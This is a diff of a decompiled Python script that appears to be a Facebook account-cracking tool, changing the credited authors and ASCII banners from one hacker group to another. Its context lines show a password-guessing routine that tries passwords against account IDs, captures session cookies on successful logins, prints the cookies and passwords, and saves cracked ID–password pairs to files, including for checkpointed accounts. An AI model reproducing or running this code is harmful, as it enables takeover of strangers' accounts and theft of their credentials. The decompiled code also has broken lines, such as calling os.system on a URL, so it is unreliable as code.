@@ -1,6 +1,6 @@
 # Source Generated with Decompyle++
 # File: test.pyc (Python 3.9)
-#tools make by Utpal Cyber
+#tools make by SKB TEAM
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 
 import os
@@ -17,7 +17,7 @@ class jalan:
         pass
 
 
-logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVx1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
+logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVx1b[0;m\x1b[1;32m && \x1b[1;33mALAMIN\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m Alamin Khan\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-SKB\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
 
 def ud():
     os.system('clear')
@@ -26,7 +26,7 @@ def ud():
     print(' [2] EXIT')
     opt = input('\n   Choose option >>> ')
     if opt == '1':
-        os.system('https://github.com/Cyberutpalx')
+        os.system('https://github.com/atalamin')
         FD()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -186,18 +186,18 @@ logo =                                          ("""
 \33[1;94m                                                          ______¶¶¶__________¶¶¶__¶¶¶__________¶¶______ 
 \33[1;94m                                                          _______¶¶¶_________¶______¶_________¶¶¶______
 
-\033[1;37m================= \33[32;45mUTPAL MAX\33[0;m =====================
-\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33m UTPA\33[0;m\033[1;32m && \033[1;33mKILLER\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m KILLER
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m UTPAL King
+\033[1;37m================= \33[32;45mALAMIN MAX\33[0;m =====================
+\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33m SKB\33[0;m\033[1;32m && \033[1;33mTEAM\33[0;m
+\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m  Md Alamgir hossen nishat
+\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m ALAMIN
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m TOOL IS FREE
 \033[1;32m     \033[1;35mTEAM         :  \033[1;35m SKB SILENT KILLER BANGLADESH
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 0.1
 \033[1;37m================= \33[32;45mKILEER\33[0;m =====================
  
-       \33[37;41m\t WELLCOME TO UTPAL  TOOL\33[0;m
- 
-\033[1;37m================== \33[32;45mKILEER\33[0;m ======================\n""")
+       \33[37;41m\t WELLCOME TO ALAMIN  TOOL\33[0;m
+
+\033[1;37m================== \33[32;45mSKB\33[0;m ======================\n""")
 loop = 0
 oks = []
 cps = []
@@ -347,22 +347,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(UTPAL-OK??)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(SKB-OK??)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/UTPAL-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/SKB-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(UTPAL-CP??)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/UTPAL-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('    \33[1;30m(SKB-CP??)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/SKB-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[UTPAL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[SKB] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
